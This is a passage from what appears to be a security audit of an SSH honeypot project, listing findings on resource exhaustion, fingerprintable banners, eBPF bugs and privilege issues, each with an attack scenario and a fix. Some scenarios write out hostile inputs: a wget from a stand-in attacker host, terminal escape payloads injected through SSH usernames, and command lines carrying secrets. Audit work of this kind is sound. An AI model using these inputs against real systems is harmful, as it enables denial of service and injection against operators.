**Suggested fix.** Make teardown ownership-driven rather than callback-driven. Implement `Drop` for `OverlayMount` performing a best-effort synchronous `umount` (a blocking `umount` in `Drop` is acceptable — it is fast and the alternative is leaking a kernel mount). Keep the async `teardown()` for the clean path and have it mark the mount as already-released so `Drop` is a no-op. Because forensics is async and can't run from `Drop`, hand the upperdir path to a detached cleanup task, or — more robustly — add a **startup reconciliation pass** that scans `overlay_base` for `session_*` directories left by a previous run, unmounts any stale mounts, runs forensics on each upperdir, and removes them. That also recovers the 34 directories currently sitting there. Add a session-count/age cap on `overlay_base` as a backstop.

**How to verify.** Start the gateway, connect, `kill -9` the client, and assert `overlay/` returns to empty and `grep overlay /proc/mounts` shows no new entry. Loop 100 abrupt disconnects and assert the directory count is stable. Restart with pre-seeded junk in `overlay/` and assert the reconciliation pass drains it.

---

### AEG-007 — Unbounded download size: memory and disk exhaustion via one command
**Severity:** High
**Location:** `crates/aegis-gateway/src/handler.rs:542` (`resp.bytes()`), `551` (quarantine write), `561` (mount write)

**What's wrong.** `fetch_payload_blocking` reads the entire HTTP response into memory with no size limit:
```
let bytes = resp.bytes().unwrap_or_default();
```
then writes that buffer to disk **twice** — once to `quarantine/<sha256>`, once into the session mount root. The only bound is `.timeout(Duration::from_secs(5))`, which limits *time*, not *bytes*: on a fast link 5 seconds is multiple gigabytes. The 7-second outer `tokio::time::timeout` (line 363) does not help either — it abandons the `oneshot` receiver, but the `spawn_blocking` task **keeps running to completion**, still allocating and still writing both copies. The attacker gets the fake progress bar back immediately and the damage proceeds invisibly in the background.

**Attack scenario.** `wget http://attacker.com/10GB.bin`. The gateway allocates ~10 GB resident and writes ~20 GB across two files. Repeat across the 8 permitted concurrent sessions per IP, or just issue it repeatedly within one session since there is no per-session fetch budget (AEG-004) — the OOM killer takes the process, or the filesystem fills. Either way the honeypot stops collecting. Note the quarantine directory has **no size cap and no retention policy**, so even legitimate captures grow without bound forever.

**Suggested fix.** Stream the response with a hard cap instead of buffering: read in chunks from `resp`, aborting once a configurable `max_payload_bytes` (a few MB is ample — real dropper payloads are small) is exceeded. Check `Content-Length` first and reject early when it is present and oversized, but do not trust it as the only check. Make the `spawn_blocking` task cancellation-aware so the outer timeout actually stops the work. Add a total quarantine-directory size cap with oldest-first eviction, and apply the same cap to the mount-root copy. Enforce a per-session and global byte budget alongside the count budget from AEG-004.

**How to verify.** Serve a response larger than the cap from a local test server and assert the quarantine file is exactly the cap size, that RSS stays flat, and that a `PayloadCaptured` event is still emitted with the truncation noted. Assert the blocking task terminates when the outer timeout fires.

---

### AEG-008 — No log rotation anywhere: `attacks.json` and `.cast` files grow without bound
**Severity:** High
**Location:** `crates/aegis-collector/src/lib.rs:57-79` (append-only `attacks.json`), `169-181` (`.cast` writes); `crates/aegis-gateway/src/handler.rs:425-433`

**What's wrong.** You flagged this as known-missing; it is worse than a housekeeping gap because the attacker controls the write volume and the amplification factor is large.

- `attacks.json` is opened `.append(true)` and written one JSON line per event, flushed every event, forever. No rotation, no size cap, no retention.
- Each session's `.cast` file records **every echoed keystroke as its own JSON line** (`handler.rs:432` calls `record_output` per character). One attacker byte becomes roughly 30–40 bytes of `[12.345678,"o","A"]\n` on disk. That is a **~35× disk amplification factor on raw typed input**, and with AEG-002's uncapped `cmd_buffer` there is no limit on how much can be typed in a single line.

**Attack scenario.** Open a session and stream printable bytes without ever sending a newline. 100 MB of input becomes ~3.5 GB of `.cast`. Meanwhile every command line issued appends a `COMMAND_RUN` event to `attacks.json`, which is never rotated. Filling the filesystem is not just a local DoS: once writes fail, `SessionRecorder::open` starts returning `Err`, which hits the `.expect()` in AEG-012 and panics the accept path. **Disk exhaustion escalates into a crash.** It also takes the dashboard down with it (AEG-022).

**Suggested fix.** Rotate `attacks.json` by size and/or age with a bounded retention set (either integrate `tracing-appender`'s rolling file support — already in the tree via `tracing-subscriber` — or implement size-triggered rename + reopen; the dashboard tailer already handles truncation/rotation correctly at `main.rs:254-258`, so it will follow). Cap per-session `.cast` size and stop recording past the cap with a marker event rather than letting it grow. Batch keystroke output into the cast rather than one record per byte — coalesce per network read, which you already do for `flush()` (`handler.rs:441`), and which would cut the amplification by an order of magnitude. Add a total `sessions/` directory cap with oldest-first eviction, and monitor free space with a refuse-new-sessions threshold.

**How to verify.** Stream 100 MB into a session; assert the `.cast` file stops at the configured cap and the process stays healthy. Drive `attacks.json` past the rotation threshold and assert rotation occurs, old files are pruned, and the dashboard's event feed continues uninterrupted across the boundary.

---

### AEG-009 — The SSH banner announces `russh`, defeating the entire anti-fingerprinting premise
**Severity:** High
**Location:** `crates/aegis-gateway/src/handler.rs:667-675` (`build_russh_config`)

**What's wrong.** `build_russh_config` sets `inactivity_timeout`, `auth_rejection_time`, `auth_rejection_time_initial`, and `keys` — then `..Default::default()`. It **never sets `server_id`**. Confirmed in the vendored source at `russh-0.46.0/src/server/mod.rs:98-101`:

```
server_id: SshId::Standard(format!("SSH-2.0-{}_{}", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION")))
```

Every connection therefore advertises **`SSH-2.0-russh_0.46.0`** in cleartext, before any key exchange.

This directly contradicts three separate documented claims: `handler.rs:1` (*"Async SSH frontend with OpenSSH 9.6p1 anti-fingerprint spoofing"*), `README.md:48` (*"Anti-Fingerprinting Engine: Emulates OpenSSH 9.6p1 protocol characteristics, banners... to defeat scanners like Shodan and Censys"*), and `README.md:66`. **No such code exists anywhere in the workspace** — `grep -rn "server_id\|SSH-2.0"` across `crates/` returns nothing. The feature was documented but never implemented.

**Attack scenario.** `nc target 2222` returns the banner in one round trip — no auth, no interaction. Shodan and Censys index this string on their routine scans, so the honeypot is publicly catalogued as a Rust SSH server, not an Ubuntu box, and any attacker checking Shodan before engaging skips it. It is also self-inconsistent to the point of absurdity: the banner says `russh` while the shell claims `Ubuntu 22.04.2 LTS` and `OpenSSH`-style `sshd` processes in `ps`.

**Compounding: HASSH.** Even with the banner corrected, the `hasshServer` fingerprint — an MD5 over the server's KEX/cipher/MAC/compression algorithm lists from `SSH_MSG_KEXINIT` — is russh's default set, which does not match any OpenSSH release. This is precisely the documented use of HASSH: *"A hasshServer known to belong to the SSH honeypot server installation (like Cowrie or Kippo) can be detected when it is purporting to be a common OpenSSH server."* Internet-wide scans have identified thousands of Cowrie/Kippo instances this way. Additionally, only an Ed25519 host key is offered (`main.rs:41`), whereas real OpenSSH 9.6p1 offers `rsa-sha2-512`/`rsa-sha2-256` alongside `ssh-ed25519` — another free discriminator in the same packet.

**Suggested fix.** Set `server_id: SshId::Standard("SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.4".into())` — matching a real Ubuntu 22.04 package string, and keeping it consistent with the `uname`/`os-release` the shell reports. Then align the algorithm lists in `russh::Preferred` (kex, cipher, mac, compression, key order) to the exact order OpenSSH 9.6p1 advertises, and add an RSA host key so the offered host-key algorithms match. Capture a real `ssh -vvv` KEXINIT from an actual Ubuntu 22.04 box and mirror it field by field. Add a test asserting the computed `hasshServer` MD5 equals the reference OpenSSH 9.6p1 value — that turns fingerprint drift into a build failure instead of a silent regression. Until this lands, soften the README claims rather than leaving an operator to trust them.

**How to verify.** `nc target 2222 | head -1` shows the OpenSSH string. Compute `hasshServer` from a packet capture (the `salesforce/hassh` reference implementation) and diff against a real Ubuntu 22.04 OpenSSH server. Cross-check `nmap -sV -p 2222` and, after a scan cycle, the Shodan banner.

---

### AEG-010 — Terminal escape injection from SSH username/password into the operator's console
**Severity:** High
**Location:** `crates/aegis-collector/src/lib.rs:87-116` (`print_event`), reached from `crates/aegis-gateway/src/handler.rs:250-272`

**What's wrong.** `print_event` writes attacker-controlled strings straight to the operator's terminal wrapped in ANSI color codes, with no sanitization:
```
eprintln!("\x1b[93m[!] CRED: {} | {}:{}\x1b[0m", e.ip, e.username, pw);
```
The interactive shell path is safe by accident — `data()` only admits `is_ascii_graphic() || b' '` into `cmd_buffer` (`handler.rs:425`), so `COMMAND_RUN` can't carry `0x1b`. **But usernames and passwords do not go through that filter.** They arrive as arbitrary SSH protocol strings via `auth_password(user, password)` and `auth_publickey(user, ...)` and are forwarded verbatim. An SSH username may contain any bytes, including ESC.

**Attack scenario.** Authenticate with a username containing terminal control sequences. Depending on the operator's terminal this ranges from nuisance to serious: `\x1b[2J` clears their screen; `\x1b]0;...\x07` rewrites the window title; `\x1b]52;c;<base64>\x07` (OSC 52) **writes to the operator's clipboard** on terminals that honour it; cursor-positioning sequences let an attacker overwrite earlier log lines to forge or erase evidence of their own session. Several terminal emulators have historically had far worse escape-driven bugs. The operator's console is a trusted surface being fed untrusted bytes — and an attacker who knows a honeypot is watched can target the watcher. CWE-150. This is a known historical issue class for honeypots specifically, since displaying attacker input is their whole job.

The same unsanitized strings are also written to `attacks.json`, so anyone later running `cat attacks.json` re-triggers the sequences.

**Suggested fix.** Sanitize at the boundary where attacker data becomes operator-visible. Add a helper that escapes or strips C0/C1 control characters (everything `< 0x20` except none, plus `0x7f`, plus C1 `0x80-0x9f`) and renders them as visible `\xNN` — apply it to every attacker-derived field in `print_event`. Prefer emitting structured JSON logs (`LoggingConfig.json` already exists at `common/src/lib.rs:400-403` but is never honoured) since `serde_json` escapes control characters automatically. Also cap username/password length at the handler before they enter the pipeline — currently unbounded, which additionally feeds AEG-011.

**How to verify.** `ssh -p 2222 "$(printf 'user\033[2J\033[H')"@target` and confirm the operator console shows a literal escaped form and is not cleared. Assert `attacks.json` contains no raw `0x1b` byte: `grep -P '\x1b' attacks.json` returns nothing.

---

### AEG-011 — Dashboard's credential maps are unbounded: remote memory exhaustion
**Severity:** High
**Location:** `crates/aegis-dashboard/src/store.rs:40-49`

**What's wrong.** `Store` caps exactly the collections the author thought about and misses the ones the attacker controls most directly. `insert_capped` (line 324) bounds `known_full_commands` (`COMMAND_CAP = 3000`) and the IOC sets (`IOC_CAP = 500`), with a comment explicitly reasoning about *"attacker scripts embed randomized tokens, so without a cap these sets could grow without bound."* That reasoning is correct — and it was not applied to:

```
unique_ips:      HashSet<IpAddr>        // unbounded
ip_counts:       HashMap<IpAddr, u64>   // unbounded
country_counts:  HashMap<String, u64>   // bounded in practice (~200)
username_counts: HashMap<String, u64>   // unbounded, attacker-controlled keys
password_counts: HashMap<String, u64>   // unbounded, attacker-controlled keys
command_counts:  HashMap<String, u64>   // unbounded (first verb only)
```

`username_counts` and `password_counts` are keyed by **raw attacker-supplied strings of unbounded length** (see AEG-010 — no length cap is applied anywhere). `command_counts` is keyed by the first whitespace token of any command, equally attacker-chosen.

**Attack scenario.** A credential-stuffing bot — which is the *normal* traffic a honeypot receives, not even a deliberate attack — supplies a unique username and password per attempt. Every one is retained forever. At 20 connects/min/IP across a modest botnet, with each pair a few hundred bytes, the dashboard's resident set climbs steadily until the OOM killer takes it. A deliberate attacker accelerates this with long random usernames. The gateway keeps running, so the operator loses visibility precisely while under active attack — the worst possible time. `/api/known` (`main.rs:400`) then serializes **every distinct username and password ever seen** into a single JSON response, so one authenticated dashboard load turns a large map into a large allocation plus a large response body.

**Suggested fix.** Apply the existing `insert_capped` discipline uniformly. These are ranking inputs feeding `top_n` (TOP_N = 10), so exact long-tail counts have no value: bound each map with a cap in the low thousands, or switch to a count-min sketch / top-k structure if you want accurate heavy hitters with fixed memory. Cap `unique_ips`/`ip_counts` the same way (this also blunts AEG-013's IPv6 vector). Truncate username/password to a sane maximum (e.g. 256 bytes) at the gateway before they ever enter an event. Paginate `/api/known` rather than returning the full corpus.

**How to verify.** Feed the tailer 1,000,000 synthetic `CREDENTIAL_HARVEST` events with unique credentials and assert the process RSS plateaus and each map's `len()` stays at its cap. Assert `/api/known` response size is bounded.

---

### AEG-012 — `.expect()` in the connection accept path, plus blocking sandbox setup
**Severity:** High
**Location:** `crates/aegis-gateway/src/handler.rs:627-641`

**What's wrong.** `new_client` — called for **every inbound connection**, before any admission decision has finished paying off — does two things it should not:

```
let (recorder, sandbox) = tokio::task::block_in_place(|| {
    tokio::runtime::Handle::current().block_on(async {
        let rec = aegis_collector::SessionRecorder::open(cast_path, session_id.clone())
            .await
            .expect("Failed to open session recorder");   // <-- panics
        let sb = aegis_vmm::spawn_sandbox(&meta, lower_dir, overlay_base).await.ok();
        (rec, sb)
    })
});
```

1. **`.expect()` on a fallible I/O operation.** `SessionRecorder::open` fails when the disk is full, the inode table is exhausted, or the process hits its file-descriptor limit — all conditions an attacker can *drive* via AEG-008 (disk) or connection churn (fds). This is the escalation path that turns resource exhaustion into a crash.
2. **Blocking the runtime inside the accept path.** `block_in_place` + `block_on` performs `create_dir_all`, file creation, a rootfs existence check, and an OverlayFS `mount()` syscall synchronously. `block_in_place` moves other tasks off the worker, but it still serializes connection setup behind filesystem and mount syscalls. An attacker opening connections at the permitted rate from many IPs makes every session's setup queue behind mount operations, which is a cheap latency-amplification lever — and a *timing* signal (AEG-024) distinguishing a fresh session from a warm one.

**Attack scenario.** Fill the disk via AEG-008, or exhaust file descriptors by opening many concurrent sessions (each holds a `.cast` file plus a socket, with `max_sessions = 512` in `deploy/config.toml` and no `RLIMIT_NOFILE` tuning documented). The next connection panics in `new_client`. The panic unwinds a task rather than aborting the process, so the immediate blast radius is one connection — but it fires on *every* subsequent connection while the condition persists, so the honeypot is effectively dead while appearing to run.

**Suggested fix.** Replace `.expect()` with proper handling: on recorder-open failure, log and return `SessionHandler::Rejected` (the variant already exists and needs no new code), releasing the semaphore permit and IP-guard slot. A honeypot that declines a session it can't record is behaving correctly; one that panics is not. Move the sandbox/recorder provisioning out of the synchronous accept path — russh's `Handler` methods are async, so defer provisioning to the first `shell_request`/`pty_request`, which also avoids paying mount cost for connections that never authenticate. Set an explicit `RLIMIT_NOFILE` at startup sized against `max_sessions`, and add a free-space precondition that refuses new sessions below a threshold instead of failing mid-write.

**How to verify.** Set a tiny `RLIMIT_NOFILE`, open connections until recorder creation fails, and assert the process logs a rejection and stays alive while continuing to serve. Fill a test filesystem and assert the same. Measure connection-setup latency under churn before and after moving provisioning out of `new_client`.

---

## MEDIUM

### AEG-013 — Per-IP rate limiting is trivially bypassed over IPv6, and the guard map leaks
**Severity:** Medium
**Location:** `crates/aegis-gateway/src/handler.rs:115-148`

**What's wrong.** Two related defects in `IpConnectionGuard`.

1. **Bypass.** Limits are keyed on the exact `IpAddr`. An attacker with a routed IPv6 `/64` — standard from most VPS providers and many consumer ISPs — has 2^64 source addresses and gets a fresh `max_sessions_per_ip` (8) and `max_connects_per_min_per_ip` (20) budget for each one. The per-IP controls become decorative; only the global `max_sessions` semaphore (512) still binds, and filling it denies service to real attackers whose traffic you actually want.
2. **Unbounded growth.** `release()` only removes an entry when `active == 0 && recent_connects.is_empty()`, but `recent_connects` is pruned **only inside `try_admit`** (lines 122-126). After a connection from a given IP ends, its entry retains a non-empty `recent_connects` deque and is never revisited unless that same IP connects again. Entries therefore accumulate permanently.

**Attack scenario.** Rotate a source address per connection across a `/64`. Every connection creates a permanent `HashMap<IpAddr, IpEntry>` entry that is never reclaimed, so the guard designed to bound resource use becomes an unbounded allocator driven directly by attacker connection count — while simultaneously failing to rate-limit that attacker at all. The existing tests (`handler.rs:685-732`) cover the single-IP happy path and never exercise many-IP growth or expiry.

**Suggested fix.** Key the limiter on a configurable prefix rather than the full address: `/32` for IPv4 and **`/64` for IPv6** (optionally `/48` for the aggregate), which matches allocation reality. Bound the map with an LRU or a periodic sweep evicting entries whose `active == 0` and whose newest `recent_connects` entry is older than the window; run the sweep on a timer or amortized every N admissions so it doesn't depend on the same IP returning. Add a hard cap on distinct tracked prefixes with an overflow policy. Consider a global connects-per-minute ceiling as a backstop independent of source.

**How to verify.** Unit test: admit from 100,000 distinct IPv6 addresses within one `/64` and assert both that the per-prefix limit rejects beyond the cap and that `entries.len()` stays bounded. Test that entries expire after the window with no further activity from that IP.

---

### AEG-014 — The eBPF telemetry subsystem is inert; three documented event types can never fire
**Severity:** Medium
**Location:** `crates/aegis-ebpf/src/lib.rs:27-42`, `65-69`

**What's wrong.**
```
macro_rules! include_bytes_or_empty { () => {{ &[] }}; }
static EBPF_BYTES: &[u8] = include_bytes_or_empty!();
...
if EBPF_BYTES.is_empty() { warn!("eBPF bytecode not compiled..."); return Ok(None); }
```
`EBPF_BYTES` is unconditionally empty, so `EbpfProbeSet::load` **always** returns `Ok(None)` and no probe is ever attached. There is no `build.rs`, no `xtask` crate (the referenced `cargo xtask build-ebpf` does not exist in this workspace), and `crates/aegis-ebpf/ebpf` is not a workspace member, so nothing builds the BPF object.

Consequently `SYSCALL_EXECVE`, `SYSCALL_CONNECT`, and `SYSCALL_MEMFD_CREATE` — documented in `README.md:194-196` and fully wired through `TelemetryEvent`, the collector, the store, and the dashboard's `eventDetail()` — **can never be emitted**. `README.md:11` and `:50` advertise eBPF telemetry as a headline capability, and the Dockerfile requests `CAP_BPF` and `CAP_NET_ADMIN` for it.

This is a documentation/threat-model problem more than a vulnerability: an operator reading the README will believe they have kernel-level syscall visibility and fileless-malware detection that they do not have. Given the shell is zero-execution, there are no sandbox processes to trace anyway, so the subsystem is currently both non-functional *and* architecturally unnecessary.

**Suggested fix.** Pick a direction and make the tree honest about it. Either (a) delete the eBPF crates and their README/Dockerfile claims and drop `CAP_BPF`/`CAP_NET_ADMIN` from the deployment — the capability reduction is a genuine security win, or (b) if you intend to finish it, add the `xtask`/`build.rs` that compiles the BPF object, add `crates/aegis-ebpf/ebpf` to the workspace so it is linted and type-checked, and fix AEG-015/AEG-016 first. Until then, make `load()` log at `error` rather than `warn`, and mark the three event types as unimplemented in the README.

**How to verify.** `grep -c SYSCALL_ attacks.json` on a running deployment returns 0 today. After (a), confirm the binary runs with neither capability. After (b), confirm probes attach and events appear.

---

### AEG-015 — The eBPF `connect` probe reads the wrong memory and can never emit an event
**Severity:** Medium
**Location:** `crates/aegis-ebpf/ebpf/src/main.rs:113-130`, `57`, `171`

**What's wrong.** Latent bugs in never-compiled code — they will bite the moment AEG-014 is resolved, and they are not detectable today because this crate is outside the workspace and never type-checked.

1. **`try_connect` reads its own stack, not the syscall argument.** It reads the userspace `sockaddr` pointer into `sockaddr_ptr` (line 114) and then **never uses it**:
   ```
   let sockaddr_ptr: u64 = ctx.read_at(16).ok()?;      // read...
   let mut sa = SockaddrIn { ... all zeroes ... };
   helpers::bpf_probe_read_user(&mut sa as *mut SockaddrIn).ok()?;   // ...and ignored
   ```
   The helper is passed the address of the *local* `sa`, and its return value is discarded rather than assigned. `sa` stays all-zero, so `sa.sin_family != 2` is always true and the function returns early **100% of the time**. The C2-detection probe can never fire.
2. **`ns_pid` is hardcoded to 0** in all three programs. The userspace side looks up `session_map.get(&ke.ns_pid)` (`aegis-ebpf/src/lib.rs:143`), so every event would be attributed to `SessionId("unknown")`. Session correlation is broken by construction.
3. **`pid` is actually the TID.** `bpf_get_current_pid_tgid() as u32` takes the *low* 32 bits, which is the thread ID; the process ID is the high 32 bits (`>> 32`).
4. **`let size = core::mem::size_of::<KernelEvent>();`** (line 82) is computed and unused — the kind of thing clippy would have flagged had this crate been in the workspace.

**Suggested fix.** Assign the helper result and read from the syscall pointer: `let sa: SockaddrIn = bpf_probe_read_user(sockaddr_ptr as *const SockaddrIn).ok()?;`. Populate `ns_pid` from the PID-namespace-aware helper (`bpf_get_ns_current_pid_tgid`) or drop the field and correlate differently. Use `(bpf_get_current_pid_tgid() >> 32) as u32` for the PID. Add the crate to the workspace (with the BPF target gated appropriately) so it is linted. Add a static assertion that the two `KernelEvent` definitions agree on size and field offsets — they are hand-duplicated across `aegis-common` and the BPF crate with nothing enforcing agreement (see also the `unsafe` inventory, item 9).

**How to verify.** Once compiled, attach the probes and run `curl http://example.com` on the host; assert a `SYSCALL_CONNECT` event appears with the correct destination IP and port. Assert `ns_pid` matches the expected namespace PID.

---

### AEG-016 — eBPF probes are system-wide: host process command lines would be captured and published
**Severity:** Medium
**Location:** `crates/aegis-ebpf/src/lib.rs:74-84`, `crates/aegis-ebpf/ebpf/src/main.rs:49-89`

**What's wrong.** The tracepoints attach to `syscalls/sys_enter_execve`, `sys_enter_connect`, and `sys_enter_memfd_create` **globally**, with no PID, cgroup, namespace, or UID filter in either the kernel programs or the attach calls. A tracepoint attachment is host-wide by default.

**Attack scenario.** This is a data-exfiltration-by-design problem rather than an attacker action. If eBPF were enabled, *every* `execve` on the host would be captured — including the operator's own shell commands, cron jobs, backup scripts, and any process invoked with a secret in `argv` (`mysql -p<password>`, `curl -H "Authorization: Bearer ..."`, `aws --secret-access-key ...`). Those `filename`/`argv` values flow into `attacks.json` (world-readable at 0644 per AEG-023) and are rendered on the dashboard as if they were attacker activity. Since `ns_pid` is always 0 (AEG-015), they would all be labelled `session_id: "unknown"` with no way to distinguish host noise from attacker activity — corrupting the dataset as well as leaking secrets.

**Suggested fix.** Filter in the kernel program before `reserve()`/`submit()`: maintain a BPF map of sandbox PIDs/cgroup IDs populated by the gateway, and return early for anything not in it. Filtering in the kernel (not userspace) keeps the ring buffer from being flooded by host activity. Prefer cgroup-scoped attachment (`BPF_PROG_TYPE_CGROUP_*` or `bpf_get_current_cgroup_id()` matching) over PID lists, which race against process creation. Redact `argv` beyond `argv[0]` by default, since full argument vectors are the highest-risk field.

**How to verify.** With probes attached, run a distinctive command as the operator (`/bin/true --canary-token`) and assert it does **not** appear in `attacks.json`. Assert the ring buffer stays quiet while the host is busy but idle of sandbox activity.

---

### AEG-017 — Forensics loads whole files into memory with ~4× amplification
**Severity:** Medium
**Location:** `crates/aegis-forensics/src/lib.rs:203` (`fs::read`), `228-229`, `80-102` (`extract_strings`), `108-109` (`extract_iocs`)

**What's wrong.** `analyze_file` reads each candidate file entirely into memory, then amplifies it:
```
let data = fs::read(path).await?;              // 1× file size
let strings = extract_strings(&data, min_len); // ~1× more, as Vec<String>
let iocs = extract_iocs(&strings);             // haystack = strings.join(" ") — ~1× more
fs::write(&qpath, &data).await?;               // full copy written to quarantine
```
`extract_strings` collects every printable run ≥ `string_min_len` (default 6) into owned `String`s; for a text-heavy file that approaches the original size again. `extract_iocs` then calls `strings.join(" ")`, materializing yet another full copy as a single `String`. Peak resident is roughly 3–4× the file size, with no size check anywhere before the read.

**Attack scenario.** Chains off AEG-007: fetch a large file via `wget` so it lands in the session mount root (`handler.rs:561`), then disconnect cleanly so `teardown_session` runs forensics over the upperdir. A 2 GB drop becomes ~8 GB peak RSS during analysis. `analyze_upperdir` walks *every* file in the upperdir sequentially, so many medium files compound. Note this path only triggers on clean teardown — ironically, AEG-006's leak means a rude attacker avoids it while a polite one triggers it.

**Suggested fix.** Impose a `max_analysis_bytes` cap: `stat` each file first and skip (with a logged event recording the size and hash-of-prefix) anything above it. Stream the hash rather than buffering — `Sha256` supports incremental `update` over a chunked read, which removes the need to hold the file at all. Run `extract_strings` over a bounded prefix (the first few MB is plenty for IOC extraction) and make it borrow `&str` slices instead of allocating owned `String`s. Replace `strings.join(" ")` with running the regexes per-string or over a reusable buffer. Quarantine by rename/hardlink from the upperdir where possible instead of read-then-write.

**How to verify.** Drop a 2 GB file into a test upperdir, run `analyze_upperdir`, and assert peak RSS stays within a small multiple of the cap rather than the file size. Assert a `PayloadCaptured` event is still emitted with a correct SHA-256 computed incrementally.

---

### AEG-018 — Per-session `unshare()` on shared tokio worker threads; namespace isolation is decorative
**Severity:** Medium
**Location:** `crates/aegis-vmm/src/lib.rs:240-245`

**What's wrong.**
```
let unshare_flags = libc::CLONE_NEWUTS | libc::CLONE_NEWPID;
let ret = unsafe { libc::unshare(unshare_flags) };
if ret != 0 { debug!("unshare returned {ret} — operating with userspace mount isolation"); }
```
Three problems:
1. **It achieves nothing.** `CLONE_NEWPID` does not move the caller into a new PID namespace — it only affects *future children*. `spawn_sandbox` forks no child (`child_pid: None`, `master: None` at lines 248-252), and the shell is a pure Rust dispatcher that never executes anything. So the new PID namespace is created and immediately abandoned.
2. **It mutates shared runtime state.** `unshare(CLONE_NEWUTS)` operates on the **calling thread**. This runs on whichever tokio worker thread happens to service the connection, so it gives *that worker* — shared by unrelated sessions and unrelated tasks for the rest of the process lifetime — a different UTS namespace. It is called once per session, so workers accumulate divergent namespace state non-deterministically. Any future code that reads the hostname will behave differently depending on which worker it lands on.
3. **The failure is silently tolerated** at `debug!` level, and the log message claims "operating with userspace mount isolation," which overstates what remains.

Combined with `SandboxHandle` carrying `master: None` and `child_pid: None`, and `PtyPair` being dead code, the "PID/Net/Mount/UTS namespaces, each session gets its own PTY" described in the module doc (`lib.rs:3-4`) **does not exist**. The actual isolation is: a per-session directory, plus the fact that nothing is ever executed.

To be fair: *because* the shell is zero-execution, the absence of namespaces is not currently exploitable. The risk is that the code and docs assert an isolation boundary that a future change (adding real command execution, a PTY, anything forking) would silently rely on.

**Suggested fix.** Remove the `unshare` call and the dead `PtyPair`/`child_pid`/`master` scaffolding, and correct the module documentation to describe what the design actually is — a zero-execution emulator with per-session directory isolation. That is a defensible architecture; it just isn't the one documented. If real execution is ever introduced, do the isolation properly in a forked child (`clone`/`unshare` *in the child*, before `exec`), never on a shared runtime thread. This removes one of the two host-side `unsafe` blocks.

**How to verify.** After removal, confirm sessions still provision and tear down correctly. Assert no `unsafe` remains in `aegis-vmm` outside `PtyPair` (or none at all if that is removed too).

---

### AEG-019 — OverlayFS mounted without `nodev`/`nosuid`/`noexec`, and the process needs `CAP_SYS_ADMIN`
**Severity:** Medium
**Location:** `crates/aegis-vmm/src/lib.rs:102-113`; `deploy/Dockerfile:31-39`

**What's wrong.** The mount passes `MsFlags::empty()`:
```
let options = format!("lowerdir={lower_str},upperdir={upper_str},workdir={work_str}");
nix::mount::mount(Some("overlay"), mount_str.as_ref(), Some("overlay"), nix::mount::MsFlags::empty(), Some(options.as_str()))
```
No `MS_NODEV`, `MS_NOSUID`, or `MS_NOEXEC`; no `redirect_dir=off`, `metacopy=off`, or `userxattr`. Nothing in the current design executes from these mounts, so this is defense-in-depth rather than an active hole — but the mount is performed by a root/`CAP_SYS_ADMIN` process with a lowerdir that is **world-writable** (AEG-023), and downloaded attacker payloads are written into the mount root (`handler.rs:561`).

**Context on the privilege itself.** Performing the mount in-process means the gateway — the same process that parses unauthenticated attacker bytes — holds `CAP_SYS_ADMIN`, which is broadly equivalent to root. The Dockerfile requests `--cap-add=CAP_SYS_ADMIN` alongside `CAP_BPF` and `CAP_NET_ADMIN`. `CAP_SYS_ADMIN` plus OverlayFS is precisely the configuration behind the OverlayFS local-privilege-escalation family: **CVE-2023-0386** (kernels 5.11–6.1.8, CVSS 7.8, setuid capability preservation during copy-up) was added to CISA's Known Exploited Vulnerabilities catalog on 2025-06-17, and the Ubuntu-specific **GameOver(lay)** pair (**CVE-2023-2640**, **CVE-2023-32629**, both 7.8) covers the same ground. Those require a local user able to create a writable mount; the honeypot's zero-execution design means an attacker has no such foothold *today*. The exposure is that a single change introducing execution — or any memory-safety bug in the SSH parser (AEG-001) reaching code execution — lands in a process that already holds the capability needed to exploit them.

Also note the Dockerfile sets `USER aegis` (line 43) while documenting `--cap-add`. Container capabilities are not inherited into a non-root user's permitted set without file capabilities or ambient caps, so as written the mount will most likely **fail silently** and fall back to `upper_dir` (`lib.rs:229-238`) — which is why this dev box shows `grep -c overlay /proc/mounts` = 0 while 34 session directories exist.

**Suggested fix.** Add `MS_NODEV | MS_NOSUID | MS_NOEXEC` to the mount flags and the `redirect_dir=off,metacopy=off` options regardless of current exploitability — they are free. Drop `CAP_SYS_ADMIN` from the long-running process: either do the mounts in a tiny privileged helper that drops privileges immediately and hands back a file descriptor, or use a mount namespace set up once at startup before dropping capabilities, or accept the directory-only fallback (which is what actually runs today) and remove the mount path entirely. Keep the host kernel patched for CVE-2023-0386 and GameOver(lay) regardless. Resolve the Dockerfile's `USER` vs. capability contradiction so the deployment's actual privilege level is intentional rather than accidental.

**How to verify.** `grep aegis /proc/mounts` shows `nodev,nosuid,noexec` on session mounts. `capsh --print` (or `/proc/<pid>/status` `CapEff`) on the running process confirms `CAP_SYS_ADMIN` is absent. Confirm mounts either genuinely succeed or the fallback is the documented, intended behaviour — not an unnoticed silent failure.

---

### AEG-020 — No CSP or security headers; bearer token in `localStorage`
**Severity:** Medium
**Location:** `crates/aegis-dashboard/src/main.rs:92-106`; `crates/aegis-dashboard/static/index.html:503-518`

**Credit where due:** the XSS review came back clean. `escapeHtml` (`index.html:538`) correctly escapes `& < > " '`, and it is applied consistently — including in attribute contexts (`title="${escapeHtml(...)}"`, `data-ip="${escapeHtml(...)}"`), inside `eventDetail()` for every attacker-controlled field (command, username, password, source_url, filename, argv, memfd name), and across the session archive, feed, payload, IOC, and modal-timeline renderers. The session replay uses `textContent` throughout (`index.html:1133-1153`), so attacker-typed terminal output cannot become markup. The bearer-token gap you flagged is **closed**: `constant_time_eq` (`main.rs:207-210`) uses `subtle::ConstantTimeEq` with a length check, applied via `.layer` so every route including 404s is covered. Token generation draws 32 bytes from two v4 UUIDs (OS CSPRNG) and is persisted at mode 0600.

**What's wrong** is the missing second layer. There is no `Content-Security-Policy`, `X-Content-Type-Options`, `Referrer-Policy`, or `X-Frame-Options` on any response — the router adds no header middleware at all. Meanwhile the bearer token is stored in `localStorage` (`index.html:508,512`), which is readable by any script in the origin.

**Attack scenario.** Today there is no known XSS. The finding is that the failure mode is maximal if one ever appears: a single missed `escapeHtml` in a future renderer — and every render path here is hand-escaped string concatenation into `innerHTML`, which is exactly the pattern that regresses — yields script execution, and the first thing that script reads is `localStorage.getItem('aegis_token')`, which is a long-lived, non-expiring credential to the full telemetry API. A CSP of `default-src 'self'; script-src 'self'` would not stop a `<script>` injection into `innerHTML` (inline execution via `innerHTML` is already blocked by the HTML spec), but `connect-src 'self'` would block exfiltration of the stolen token to an attacker-controlled endpoint, which is the step that matters.

